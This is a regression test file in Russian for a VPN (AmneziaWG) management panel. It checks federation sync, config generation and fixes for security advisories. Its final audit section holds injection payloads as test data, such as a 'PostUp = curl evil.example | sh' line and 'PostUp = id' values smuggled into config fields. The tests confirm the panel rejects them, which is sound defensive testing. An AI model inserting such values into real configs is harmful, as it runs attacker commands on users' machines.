import { afterEach, beforeAll, afterAll, describe, expect, it, vi } from 'vitest';
import { db, initDatabase } from '../src/db/index.js';
import { AuthService } from '../src/services/auth.service.js';
import { AwgService } from '../src/services/awg.service.js';
import { FederationClient, isPendingIp } from '../src/services/federation-client.service.js';
import { ProvisionService } from '../src/services/provision.service.js';
import { SshService } from '../src/services/ssh.service.js';
import { decryptSecret, encryptSecret, isEncrypted } from '../src/services/secrets.service.js';
import { buildClashConfig } from '../src/routes/subscription.js';
import { paramsToColumns, parseServerConfig } from '../src/utils/awg-params.js';
import { startTestServer } from './test-app.js';

/**
 * Регрессионные тесты по открытым Issues и черновикам Security Advisories: каждый сценарий проверяется на реальном коде
 * (роуты, сервисы, БД), без копирования логики в тест.
 */

const PUBKEY_PLACEHOLDER = 'X'.repeat(43) + '=';
const PSK_FROM_OWNER = 'B'.repeat(43) + '=';

let testEnv: Awaited<ReturnType<typeof startTestServer>>;
let adminToken: string;

const adminHeaders = () => ({ Authorization: `Bearer ${adminToken}`, 'Content-Type': 'application/json' });

async function api(path: string, method = 'GET', body?: unknown) {
  const res = await testEnv.request(path, { method, headers: adminHeaders(), body: body === undefined ? undefined : JSON.stringify(body) });
  const text = await res.text();
  return { status: res.status, body: text ? JSON.parse(text) : null };
}

beforeAll(async () => {
  initDatabase();
  AuthService.resetAdmin('admin_issues', 'TestPassword123!');
  adminToken = AuthService.login('admin_issues', 'TestPassword123!')!.token;
  testEnv = await startTestServer();
});

afterAll(async () => {
  await testEnv.close();
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  delete process.env.ALLOW_INSECURE_FEDERATION;
});

function insertServer(name: string, host: string, managedBy = 'demension'): number {
  const result = db.prepare(`
    INSERT INTO servers (name, host, awg_port, status, subnet, managed_by) VALUES (?, ?, 51820, 'online', '10.8.0.1/24', ?)
  `).run(name, host, managedBy);
  return Number(result.lastInsertRowid);
}

// ==============================================================================
// Имитация панели владельца нод (для сценариев FederationClient)
// ==============================================================================

interface RemoteState {
  peers: Map<number, any>;
  calls: { method: string; path: string; body: any }[];
  nextPeerId: number;
  nodeName: string;
  nodeParams: Record<string, unknown>;
  nodeHost: string;
  /** IP, который панель владельца вернёт новому клиенту (по умолчанию выдаётся из 10.50.0.0/24) */
  assignedIp?: string;
  /** Задержка ответа панели владельца: без неё гонка «ответ раньше синхронизации» не воспроизводится */
  latencyMs: number;
}

const FULL_PARAMS = {
  awg_version: 3, jc: 4, jmin: 40, jmax: 70, s1: 36, s2: 124, s3: 15, s4: 16,
  h1: '100-200', h2: '300-400', h3: '500-600', h4: '700-800',
  i1: null, i2: null, i3: null, i4: null, i5: null, header_protection_key: null, extra_params: {},
};

function newRemote(overrides: Partial<RemoteState> = {}): RemoteState {
  return { peers: new Map(), calls: [], nextPeerId: 100, nodeName: 'Remote node', nodeParams: FULL_PARAMS, nodeHost: '203.0.113.7', latencyMs: 0, ...overrides };
}

function stubRemotePanel(state: RemoteState) {
  const realFetch = globalThis.fetch;
  vi.stubGlobal(
    'fetch',
    vi.fn(async (url: string, init: RequestInit = {}) => {
      // Запросы тестового клиента к самой панели проходят как обычно, подменяется только панель владельца
      if (String(url).startsWith(testEnv.baseUrl)) return realFetch(url, init);
      const path = String(url).split('/api/federation/v1')[1];
      const method = init.method || 'GET';
      const body = init.body ? JSON.parse(String(init.body)) : undefined;
      state.calls.push({ method, path, body });
      if (state.latencyMs) await new Promise((resolve) => setTimeout(resolve, state.latencyMs));
      const reply = (json: unknown, status = 200) => new Response(JSON.stringify(json), { status, headers: { 'content-type': 'application/json' } });

      if (method === 'GET' && path === '/info') return reply({ api_version: 1, partner_name: 'Owner', limits: null });
      if (method === 'GET' && path === '/nodes') {
        return reply({
          nodes: [{ id: 7, name: state.nodeName, host: state.nodeHost, port: 51820, public_key: PUBKEY_PLACEHOLDER, status: 'online', params: state.nodeParams }],
          limits: null,
        });
      }
      if (method === 'GET' && path === '/peers') return reply({ peers: [...state.peers.values()] });
      if (method === 'POST' && path === '/peers') {
        const existing = [...state.peers.values()].find((p) => p.remote_ref === body.remote_ref);
        if (existing) {
          existing.public_key = body.public_key;
          return reply({ peer: existing });
        }
        const id = state.nextPeerId++;
        const peer = {
          id, node_id: body.node_id, name: body.name, remote_ref: body.remote_ref, public_key: body.public_key,
          client_ip: state.assignedIp ?? `10.50.0.${id - 90}`, preshared_key: PSK_FROM_OWNER, enabled: body.enabled, owner_blocked: false,
          total_rx: 0, total_tx: 0, last_handshake: null,
        };
        state.peers.set(id, peer);
        return reply({ peer }, 201);
      }
      const match = /^\/peers\/(\d+)$/.exec(path || '');
      if (match && method === 'PATCH') {
        const peer = state.peers.get(Number(match[1]));
        Object.assign(peer, body);
        return reply({ peer });
      }
      if (match && method === 'DELETE') {
        state.peers.delete(Number(match[1]));
        return reply({ success: true });
      }
      return reply({ error: `unexpected ${method} ${path}` }, 500);
    })
  );
}

let panelCounter = 0;

/** Подключённая панель партнёра с одной нодой (удалённый узел #7) */
async function createRemotePanel(state: RemoteState): Promise<{ panelId: number; serverId: number }> {
  stubRemotePanel(state);
  const panelId = await FederationClient.connect(`https://owner-${++panelCounter}.example.com#dp_${'a'.repeat(32)}`, 'Owner');
  const server = db.prepare('SELECT id FROM servers WHERE remote_panel_id = ?').get(panelId) as { id: number } | undefined;
  return { panelId, serverId: server?.id ?? 0 };
}

// ==============================================================================
// Issues
// ==============================================================================

describe('#28 сброс трафика пользователя', () => {
  it('обнуляет итоги, но сохраняет счётчики интерфейса — старый трафик не возвращается при следующем опросе ноды', async () => {
    const serverId = insertServer('Traffic', '192.0.2.28');
    const subscriberId = Number(db.prepare("INSERT INTO subscribers (name, token) VALUES ('t', 'sub_t28')").run().lastInsertRowid);
    db.prepare(`
      INSERT INTO clients (server_id, subscriber_id, name, client_ip, client_public_key, client_private_key, total_rx, total_tx, rx_counter, tx_counter)
      VALUES (?, ?, 'c', '10.8.0.2', 'PEERKEY28', 'priv', 500, 700, 10000, 20000)
    `).run(serverId, subscriberId);

    const res = await api(`/api/subscribers/${subscriberId}/reset-traffic`, 'POST');
    expect(res.status).toBe(200);

    const dump = (rx: number, tx: number) => `iface\tpriv\tpub\t51820\toff\nPEERKEY28\t(none)\t1.2.3.4:5\t10.8.0.2/32\t0\t${rx}\t${tx}\toff`;
    ProvisionService.applyDump(serverId, dump(10000, 20000));
    let client = db.prepare("SELECT total_rx, total_tx FROM clients WHERE client_public_key = 'PEERKEY28'").get() as any;
    expect(client).toEqual({ total_rx: 0, total_tx: 0 });

    ProvisionService.applyDump(serverId, dump(10500, 20300));
    client = db.prepare("SELECT total_rx, total_tx FROM clients WHERE client_public_key = 'PEERKEY28'").get() as any;
    expect(client).toEqual({ total_rx: 500, total_tx: 300 });
  });
});

describe('#29 конфигурации без PreSharedKey', () => {
  const server = {
    host: '203.0.113.9', awg_port: 51820, server_public_key: 'SERVERPUB=', preshared_key: null,
    ...FULL_PARAMS, extra_params: null,
  };

  it('.conf не содержит строку PresharedKey, если ключа нет ни у клиента, ни у сервера', () => {
    const conf = AwgService.generateClientConfig(server, { client_ip: '10.8.0.2', client_private_key: 'PRIV=', preshared_key: null });
    expect(conf).not.toMatch(/PresharedKey/i);
    expect(conf).not.toMatch(/\bnull\b|undefined/);
    expect(conf).toContain('AllowedIPs = 0.0.0.0/0, ::/0');
  });

  it('.conf использует ключ клиента, затем ключ сервера', () => {
    const own = AwgService.generateClientConfig(server, { client_ip: '10.8.0.2', client_private_key: 'P=', preshared_key: 'CLIENTPSK=' });
    expect(own).toContain('PresharedKey = CLIENTPSK=');
    const inherited = AwgService.generateClientConfig({ ...server, preshared_key: 'SERVERPSK=' }, { client_ip: '10.8.0.2', client_private_key: 'P=', preshared_key: null });
    expect(inherited).toContain('PresharedKey = SERVERPSK=');
  });

  it('конфигурация mihomo не содержит pre-shared-key: null', () => {
    const client = { client_ip: '10.8.0.2', client_private_key: 'PRIV=', preshared_key: null };
    const config = JSON.parse(buildClashConfig([{ name: 'n', server, client }], ['1.1.1.1'], 1280));
    expect('pre-shared-key' in config.proxies[0]).toBe(false);

    const withKey = JSON.parse(buildClashConfig([{ name: 'n', server: { ...server, preshared_key: 'SPSK=' }, client }], ['1.1.1.1'], 1280));
    expect(withKey.proxies[0]['pre-shared-key']).toBe('SPSK=');
  });
});

describe('#30 дубли серверов', () => {
  const newServer = (host: string, awgPort?: number) => ({
    name: 'S', host, ssh_password: 'pw', ...(awgPort ? { awg_port: awgPort } : {}),
  });

  it('не позволяет добавить второй сервер с тем же адресом и портом AmneziaWG', async () => {
    expect((await api('/api/servers', 'POST', newServer('dup30.example.com'))).status).toBe(201);

    const same = await api('/api/servers', 'POST', newServer('dup30.example.com'));
    expect(same.status).toBe(409);
    expect(same.body.error).toContain('уже добавлен');

    // Регистр имени хоста не важен
    expect((await api('/api/servers', 'POST', newServer('DUP30.example.com'))).status).toBe(409);
    // Другой порт — другой сервер
    expect((await api('/api/servers', 'POST', newServer('dup30.example.com', 51821))).status).toBe(201);
  });

  it('проверяет дубль и при смене адреса/порта существующего сервера', async () => {
    const a = (await api('/api/servers', 'POST', newServer('put30-a.example.com'))).body;
    const b = (await api('/api/servers', 'POST', newServer('put30-b.example.com'))).body;

    expect((await api(`/api/servers/${b.id}`, 'PUT', { host: 'put30-a.example.com' })).status).toBe(409);
    expect((await api(`/api/servers/${b.id}`, 'PUT', { name: 'Переименован' })).status).toBe(200);
    expect((await api(`/api/servers/${a.id}`, 'PUT', { host: 'put30-a.example.com', awg_port: 51820 })).status).toBe(200);
  });
});

describe('#31 импорт пиров с AllowedIPs без /32', () => {
  it('разбирает адрес без маски, с /32 и с пробелами вокруг слэша', () => {
    const conf = `
[Interface]
PrivateKey = aaaaaa=
Address = 10.8.0.1/24
ListenPort = 51820

[Peer]
PublicKey = bare=
AllowedIPs = 10.8.0.2

[Peer]
PublicKey = slash32=
AllowedIPs = 10.8.0.3/32

[Peer]
PublicKey = spaced=
AllowedIPs = 10.8.0.4 / 32

[Peer]
PublicKey = withSecond=
AllowedIPs = 192.168.0.0/24, 10.8.0.5

[Peer]
PublicKey = subnet=
AllowedIPs = 10.9.0.0/24

[Peer]
PublicKey = invalid=
AllowedIPs = 10.8.0.999
`;
    const ips = Object.fromEntries(parseServerConfig(conf).peers.map((p) => [p.publicKey, p.ip]));
    expect(ips).toEqual({
      'bare=': '10.8.0.2',
      'slash32=': '10.8.0.3',
      'spaced=': '10.8.0.4',
      'withSecond=': '10.8.0.5',
      'subnet=': null,
      'invalid=': null,
    });
  });
});

describe('#32 переход на актуальную версию протокола', () => {
  it('сохраняет extra_params сервера', async () => {
    const created = (await api('/api/servers', 'POST', { name: 'Old1x', host: 'upgrade32.example.com', ssh_password: 'pw' })).body;
    db.prepare(`
      UPDATE servers SET awg_version = 1, s3 = NULL, s4 = NULL, header_protection_key = NULL, h1 = '1', h2 = '2', h3 = '3', h4 = '4',
        extra_params = ? WHERE id = ?
    `).run(JSON.stringify({ RandomTrailers: 'on', RekeyTimeout: '10' }), created.id);

    const res = await api(`/api/servers/${created.id}/upgrade-protocol`, 'POST');
    expect(res.status).toBe(200);
    expect(res.body.server.awg_version).toBe(3);
    expect(res.body.server.extra_params).toEqual({ RandomTrailers: 'on', RekeyTimeout: '10' });
    const row = db.prepare('SELECT extra_params FROM servers WHERE id = ?').get(created.id) as { extra_params: string };
    expect(JSON.parse(row.extra_params)).toEqual({ RandomTrailers: 'on', RekeyTimeout: '10' });
  });
});

describe('#33 переименование клиента на стороне получателя', () => {
  it('передаёт новое имя владельцу нод и не повторяет запрос, когда имена совпадают', async () => {
    const remote = newRemote();
    const { panelId, serverId } = await createRemotePanel(remote);
    const clientId = Number(
      db.prepare(`
        INSERT INTO clients (server_id, name, client_ip, client_public_key, client_private_key)
        VALUES (?, 'Старое имя', 'pending:rename', ?, 'priv')
      `).run(serverId, AwgService.generateKeyPair().publicKey).lastInsertRowid
    );
    await FederationClient.requestSync(panelId);
    expect(remote.peers.size).toBe(1);

    db.prepare('UPDATE clients SET name = ? WHERE id = ?').run('Новое имя', clientId);
    remote.calls.length = 0;
    await FederationClient.requestSync(panelId);
    const patches = remote.calls.filter((c) => c.method === 'PATCH');
    expect(patches).toHaveLength(1);
    expect(patches[0].body).toEqual({ name: 'Новое имя' });
    expect([...remote.peers.values()][0].name).toBe('Новое имя');

    remote.calls.length = 0;
    await FederationClient.requestSync(panelId);
    expect(remote.calls.filter((c) => c.method === 'PATCH')).toHaveLength(0);
  });
});

describe('#35 длинные имена клиентов на нодах партнёра', () => {
  it('пир пользователя не длиннее 64 символов и успешно создаётся у владельца', async () => {
    const remote = newRemote({ nodeName: 'Б'.repeat(64) });
    const { serverId } = await createRemotePanel(remote);
    const longName = 'А'.repeat(64);

    const res = await api('/api/subscribers', 'POST', { name: longName, server_ids: [serverId] });
    expect(res.status).toBe(201);

    const client = db.prepare('SELECT name, client_ip, remote_peer_id FROM clients WHERE server_id = ?').get(serverId) as any;
    expect(client.name.length).toBeLessThanOrEqual(64);
    expect(client.name).toMatch(/^А+ \(Б+\)$/);
    expect(isPendingIp(client.client_ip)).toBe(false);
    expect(client.remote_peer_id).not.toBeNull();
    expect(remote.calls.find((c) => c.method === 'POST' && c.path === '/peers')!.body.name.length).toBeLessThanOrEqual(64);

    // Переименование пользователя тоже укладывается в лимит
    const renamed = await api(`/api/subscribers/${res.body.id}`, 'PUT', { name: 'Я'.repeat(64) });
    expect(renamed.status).toBe(200);
    const after = db.prepare('SELECT name FROM clients WHERE server_id = ?').get(serverId) as any;
    expect(after.name.length).toBeLessThanOrEqual(64);
    expect(after.name.startsWith('Я')).toBe(true);
  });
});

describe('#37 параметры нод партнёра без необязательных полей', () => {
  it('paramsToColumns заменяет отсутствующие значения на null', () => {
    const partial: any = { awg_version: 1, jc: 4, jmin: 40, jmax: 70, s1: 36, s2: 124, h1: '1', h2: '2', h3: '3', h4: '4' };
    const columns = paramsToColumns(partial);
    expect(Object.values(columns).every((v) => v !== undefined)).toBe(true);
    expect(columns.s3).toBeNull();
    expect(columns.header_protection_key).toBeNull();
  });

  it('синхронизация панели с нодой без s3/s4/i1–i5 проходит без ошибки', async () => {
    const remote = newRemote({ nodeParams: { jc: 4, jmin: 40, jmax: 70, s1: 36, s2: 124, h1: '1', h2: '2', h3: '3', h4: '4' } });
    const { panelId, serverId } = await createRemotePanel(remote);

    const panel = db.prepare('SELECT status, last_error FROM remote_panels WHERE id = ?').get(panelId) as any;
    expect(panel).toEqual({ status: 'online', last_error: null });
    const server = db.prepare('SELECT awg_version, s3, s4, i1 FROM servers WHERE id = ?').get(serverId) as any;
    expect(server).toEqual({ awg_version: 1, s3: null, s4: null, i1: null });
  });
});

describe('#38 перевыпуск ссылки подписки с нодами партнёра', () => {
  it('отвечает, только когда владелец выдал IP новым ключам, — нода не пропадает из подписки', async () => {
    const remote = newRemote({ latencyMs: 30 });
    const { serverId } = await createRemotePanel(remote);
    const created = await api('/api/subscribers', 'POST', { name: 'Reset38', server_ids: [serverId] });
    expect(created.status).toBe(201);
    const before = db.prepare('SELECT client_public_key FROM clients WHERE subscriber_id = ?').get(created.body.id) as any;

    const reset = await api(`/api/subscribers/${created.body.id}/reset-token`, 'POST');
    expect(reset.status).toBe(200);

    const client = db.prepare('SELECT client_ip, client_public_key, remote_peer_id FROM clients WHERE subscriber_id = ?').get(created.body.id) as any;
    expect(client.client_public_key).not.toBe(before.client_public_key);
    expect(isPendingIp(client.client_ip)).toBe(false);
    expect(client.remote_peer_id).not.toBeNull();

    const sub = await testEnv.request(`/sub/${reset.body.token}?format=json`);
    expect((await sub.json()).servers).toHaveLength(1);
  });

  it('удаление пользователя дожидается удаления пиров у владельца', async () => {
    const remote = newRemote({ latencyMs: 30 });
    const { serverId } = await createRemotePanel(remote);
    const created = await api('/api/subscribers', 'POST', { name: 'Delete38', server_ids: [serverId] });
    expect(remote.peers.size).toBe(1);

    expect((await api(`/api/subscribers/${created.body.id}`, 'DELETE')).status).toBe(200);
    expect(remote.peers.size).toBe(0);
  });
});

describe('#39 разбор дампа трафика', () => {
  const dumpLine = (key: string, rx: number, tx: number) => `${key}\t(none)\t1.2.3.4:5\t10.8.0.0/32\t1700000000\t${rx}\t${tx}\toff`;

  it('накапливает прирост и учитывает сброс счётчиков интерфейса', () => {
    const serverId = insertServer('Dump', '192.0.2.39');
    db.prepare(`
      INSERT INTO clients (server_id, name, client_ip, client_public_key, client_private_key) VALUES (?, 'c', '10.8.0.2', 'DUMPKEY1', 'p')
    `).run(serverId);
    const read = () => db.prepare("SELECT total_rx, total_tx, rx_counter FROM clients WHERE client_public_key = 'DUMPKEY1'").get() as any;

    ProvisionService.applyDump(serverId, `iface\n${dumpLine('DUMPKEY1', 100, 200)}`);
    ProvisionService.applyDump(serverId, `iface\n${dumpLine('DUMPKEY1', 150, 260)}`);
    expect(read()).toMatchObject({ total_rx: 150, total_tx: 260, rx_counter: 150 });
    // Контейнер перезапущен — счётчики начались с нуля
    ProvisionService.applyDump(serverId, `iface\n${dumpLine('DUMPKEY1', 30, 40)}`);
    expect(read()).toMatchObject({ total_rx: 180, total_tx: 300, rx_counter: 30 });
  });

  it('при ошибке на середине дампа не оставляет частично применённых изменений', () => {
    const serverId = insertServer('DumpAtomic', '192.0.2.40');
    const insert = db.prepare(`
      INSERT INTO clients (server_id, name, client_ip, client_public_key, client_private_key) VALUES (?, ?, ?, ?, 'p')
    `);
    insert.run(serverId, 'good', '10.8.0.2', 'ATOMIC_GOOD');
    insert.run(serverId, 'bad', '10.8.0.3', 'ATOMIC_BAD');
    db.exec(`
      CREATE TEMP TRIGGER fail_bad_update BEFORE UPDATE ON clients WHEN NEW.client_public_key = 'ATOMIC_BAD'
      BEGIN SELECT RAISE(ABORT, 'simulated failure'); END;
    `);

    try {
      expect(() =>
        ProvisionService.applyDump(serverId, `iface\n${dumpLine('ATOMIC_GOOD', 500, 600)}\n${dumpLine('ATOMIC_BAD', 700, 800)}`)
      ).toThrow('simulated failure');
    } finally {
      db.exec('DROP TRIGGER fail_bad_update');
    }

    const good = db.prepare("SELECT total_rx, rx_counter FROM clients WHERE client_public_key = 'ATOMIC_GOOD'").get() as any;
    expect(good).toEqual({ total_rx: 0, rx_counter: 0 });
  });
});

describe('#40 повторное включение клиента, заблокированного владельцем', () => {
  it('PATCH партнёра не снимает блокировку: клиент остаётся выключенным на ноде и это видно в ответе', async () => {
    process.env.ALLOW_INSECURE_FEDERATION = '1';
    const serverId = insertServer('Partnered40', '192.0.2.41');
    db.prepare("UPDATE servers SET server_public_key = ? WHERE id = ?").run(PUBKEY_PLACEHOLDER, serverId);
    const partner = (await api('/api/partners', 'POST', { name: 'P40', node_ids: [serverId] })).body;
    const fed = (path: string, method: string, body?: unknown) =>
      testEnv.request(`/api/federation/v1${path}`, {
        method,
        headers: { Authorization: `Bearer ${partner.token}`, 'Content-Type': 'application/json' },
        body: body === undefined ? undefined : JSON.stringify(body),
      });

    const created = await (await fed('/peers', 'POST', { node_id: serverId, public_key: AwgService.generateKeyPair().publicKey, name: 'Peer 40' })).json();
    const peerId = created.peer.id;

    // Владелец блокирует клиента партнёра
    expect((await api(`/api/clients/${peerId}`, 'PUT', { enabled: false })).status).toBe(200);
    const activeOnNode = () =>
      ProvisionService.getServerClients(serverId).find((c) => c.id === peerId).subscriber_active;
    expect(activeOnNode()).toBe(0);

    const patched = await (await fed(`/peers/${peerId}`, 'PATCH', { enabled: false })).json();
    expect(patched.peer.owner_blocked).toBe(true);
    const reenabled = await fed(`/peers/${peerId}`, 'PATCH', { enabled: true });
    expect(reenabled.status).toBe(200);
    expect((await reenabled.json()).peer.owner_blocked).toBe(true);

    // Блокировка действует: пир не попадает в конфигурацию ноды
    expect(activeOnNode()).toBe(0);
    const conf = AwgService.generateServerConfig(db.prepare('SELECT * FROM servers WHERE id = ?').get(serverId), ProvisionService.getServerClients(serverId));
    expect(conf).not.toContain(created.peer.public_key);

    // Блокировка снята владельцем — клиент снова активен
    await api(`/api/clients/${peerId}`, 'PUT', { enabled: true });
    expect(activeOnNode()).toBe(1);
  });

  it('получатель не пытается включить заблокированного владельцем клиента', async () => {
    const remote = newRemote();
    const { panelId, serverId } = await createRemotePanel(remote);
    db.prepare(`
      INSERT INTO clients (server_id, name, client_ip, client_public_key, client_private_key)
      VALUES (?, 'blocked', 'pending:blk', ?, 'priv')
    `).run(serverId, AwgService.generateKeyPair().publicKey);
    await FederationClient.requestSync(panelId);

    const peer = [...remote.peers.values()][0];
    peer.enabled = false;
    peer.owner_blocked = true;
    remote.calls.length = 0;
    await FederationClient.requestSync(panelId);
    expect(remote.calls.filter((c) => c.method === 'PATCH')).toHaveLength(0);

    peer.owner_blocked = false;
    await FederationClient.requestSync(panelId);
    expect(remote.calls.filter((c) => c.method === 'PATCH').map((c) => c.body)).toEqual([{ enabled: true }]);
  });
});

describe('#41 очередь применения параметров', () => {
  it('одновременные запросы применения объединяются в один перезапуск контейнера', async () => {
    const serverId = insertServer('Apply41', '192.0.2.42', 'amnezia');
    db.prepare('UPDATE servers SET deployed_port = awg_port WHERE id = ?').run(serverId);
    const exec = vi.spyOn(SshService, 'executeCommand').mockImplementation(async () => {
      await new Promise((resolve) => setTimeout(resolve, 20));
      return { code: 0, stdout: '', stderr: '' };
    });

    const results = await Promise.all([
      ProvisionService.requestApply(serverId),
      ProvisionService.requestApply(serverId),
      ProvisionService.requestApply(serverId),
    ]);
    expect(results.every((r) => r.success)).toBe(true);
    expect(exec).toHaveBeenCalledTimes(1);

    // После завершения следующий запрос выполняется как обычно
    await ProvisionService.requestApply(serverId);
    expect(exec).toHaveBeenCalledTimes(2);
  });
});

// ==============================================================================
// Security Advisories
// ==============================================================================

describe('GHSA-h73f: коллизия публичных ключей в Federation API', () => {
  it('партнёр не может присвоить своему пиру ключ другого клиента ноды', async () => {
    process.env.ALLOW_INSECURE_FEDERATION = '1';
    const serverId = insertServer('Partnered-h73f', '192.0.2.43');
    db.prepare("UPDATE servers SET server_public_key = ? WHERE id = ?").run(PUBKEY_PLACEHOLDER, serverId);
    const partner = (await api('/api/partners', 'POST', { name: 'Hijack', node_ids: [serverId] })).body;
    const fed = (body: unknown) =>
      testEnv.request('/api/federation/v1/peers', {
        method: 'POST',
        headers: { Authorization: `Bearer ${partner.token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

    const keyA = AwgService.generateKeyPair().publicKey;
    const keyB = AwgService.generateKeyPair().publicKey;
    expect((await fed({ node_id: serverId, public_key: keyA, name: 'A', remote_ref: 'a' })).status).toBe(201);
    expect((await fed({ node_id: serverId, public_key: keyB, name: 'B', remote_ref: 'b' })).status).toBe(201);

    // Чужой ключ — другого пира партнёра или клиента, созданного администратором
    const stolen = await fed({ node_id: serverId, public_key: keyA, name: 'B', remote_ref: 'b' });
    expect(stolen.status).toBe(409);
    const adminClient = (await api(`/api/servers/${serverId}/clients`, 'POST', { name: 'admin-client' })).body;
    const adminKey = (db.prepare('SELECT client_public_key FROM clients WHERE id = ?').get(adminClient.id) as any).client_public_key;
    expect((await fed({ node_id: serverId, public_key: adminKey, name: 'B', remote_ref: 'b' })).status).toBe(409);

    const stored = db.prepare("SELECT client_public_key FROM clients WHERE remote_ref = 'b' AND server_id = ?").get(serverId) as any;
    expect(stored.client_public_key).toBe(keyB);

    // Собственный ключ по-прежнему можно заменить
    const keyB2 = AwgService.generateKeyPair().publicKey;
    expect((await fed({ node_id: serverId, public_key: keyB2, name: 'B', remote_ref: 'b' })).status).toBe(200);
  });

  it('на уровне БД ключ клиента уникален в пределах ноды', () => {
    const serverId = insertServer('Unique-key', '192.0.2.44');
    const insert = db.prepare(`
      INSERT INTO clients (server_id, name, client_ip, client_public_key, client_private_key) VALUES (?, 'c', ?, 'SAMEKEY', 'p')
    `);
    insert.run(serverId, '10.8.0.2');
    expect(() => insert.run(serverId, '10.8.0.3')).toThrow(/UNIQUE/);
  });
});

describe('GHSA-82rp: токен подключённой панели партнёра', () => {
  it('хранится в БД зашифрованным и расшифровывается при запросах', async () => {
    const remote = newRemote();
    const { panelId } = await createRemotePanel(remote);
    const row = db.prepare('SELECT token FROM remote_panels WHERE id = ?').get(panelId) as { token: string };
    expect(isEncrypted(row.token)).toBe(true);
    expect(row.token).not.toContain('aaaaaaaa');
    expect(decryptSecret(row.token)).toBe(`dp_${'a'.repeat(32)}`);
    expect(encryptSecret(row.token)).toBe(row.token);
  });
});

// ==============================================================================
// Аудит: данные панели партнёра попадают в конфиги клиентов
// ==============================================================================

describe('данные панели партнёра не должны подставлять директивы в конфиги клиентов', () => {
  const subscription = async (token: string) => {
    const res = await testEnv.request(`/sub/${token}?format=json`);
    const body = await res.json();
    return (body.servers as { config: string }[]).map((s) => Buffer.from(s.config, 'base64url').toString('utf-8'));
  };
  const tokenOf = (id: number) => (db.prepare('SELECT token FROM subscribers WHERE id = ?').get(id) as { token: string }).token;

  it('нода с переводом строки в параметрах обфускации отключается, конфиги её не содержат', async () => {
    const remote = newRemote();
    const { panelId, serverId } = await createRemotePanel(remote);
    const created = await api('/api/subscribers', 'POST', { name: 'Inject1', server_ids: [serverId] });
    expect(await subscription(tokenOf(created.body.id))).toHaveLength(1);

    for (const poison of [
      { h1: '100-200\nPostUp = curl evil.example | sh' },
      { i1: '<b 0x01>\n<r 5>' },
      { jc: '4\nPostUp = id' },
      { header_protection_key: 'BAD\nPostUp = id' },
      { extra_params: { RekeyTimeout: '10\nPostUp = id' } },
    ]) {
      remote.nodeParams = { ...FULL_PARAMS, ...poison };
      await FederationClient.requestSync(panelId);

      const node = db.prepare('SELECT status, last_error, h1, i1, host FROM servers WHERE id = ?').get(serverId) as any;
      expect(node.status).toBe('uninstalled');
      expect(node.last_error).toContain('некорректные данные ноды');
      expect(node.h1).toBe('100-200');
      expect(await subscription(tokenOf(created.body.id))).toHaveLength(0);
    }

    // Владелец исправил данные — нода снова доступна
    remote.nodeParams = FULL_PARAMS;
    await FederationClient.requestSync(panelId);
    const configs = await subscription(tokenOf(created.body.id));
    expect(configs).toHaveLength(1);
    expect(configs[0]).not.toContain('PostUp');
  });

  it('адрес и порт ноды проверяются', async () => {
    const remote = newRemote({ nodeHost: '203.0.113.7\nPostUp = id' });
    const { panelId } = await createRemotePanel(remote);
    expect(db.prepare('SELECT COUNT(*) AS c FROM servers WHERE remote_panel_id = ?').get(panelId)).toEqual({ c: 0 });
    expect((db.prepare('SELECT last_error FROM remote_panels WHERE id = ?').get(panelId) as any).last_error).toContain('некорректный адрес ноды');
  });

  it('IP клиента, выданный владельцем, проверяется: некорректный адрес не попадает в конфиг', async () => {
    const remote = newRemote({ assignedIp: '10.50.0.9/32\nPostUp = id' });
    const { serverId } = await createRemotePanel(remote);
    const created = await api('/api/subscribers', 'POST', { name: 'Inject2', server_ids: [serverId] });
    expect(created.status).toBe(201);

    const client = db.prepare('SELECT client_ip, remote_state FROM clients WHERE subscriber_id = ?').get(created.body.id) as any;
    expect(isPendingIp(client.client_ip)).toBe(true);
    expect(client.remote_state).toContain('некорректный IP клиента');
    expect(await subscription(tokenOf(created.body.id))).toHaveLength(0);
  });

  it('IP и PSK из списка клиентов владельца тоже проверяются', async () => {
    const remote = newRemote();
    const { panelId, serverId } = await createRemotePanel(remote);
    const created = await api('/api/subscribers', 'POST', { name: 'Inject3', server_ids: [serverId] });
    const peer = [...remote.peers.values()].at(-1);
    const good = db.prepare('SELECT client_ip, preshared_key FROM clients WHERE subscriber_id = ?').get(created.body.id) as any;

    peer.client_ip = '10.50.0.9\nPostUp = id';
    peer.preshared_key = 'x\nPostUp = id';
    await FederationClient.requestSync(panelId);
    expect(db.prepare('SELECT client_ip, preshared_key FROM clients WHERE subscriber_id = ?').get(created.body.id)).toEqual(good);

    // Нечисловой трафик не ломает синхронизацию и не сохраняется
    peer.client_ip = good.client_ip;
    peer.preshared_key = good.preshared_key;
    peer.total_rx = { evil: true };
    await FederationClient.requestSync(panelId);
    expect((db.prepare('SELECT status FROM remote_panels WHERE id = ?').get(panelId) as any).status).toBe('online');
    expect((db.prepare('SELECT total_rx FROM clients WHERE subscriber_id = ?').get(created.body.id) as any).total_rx).toBe(0);
  });
});
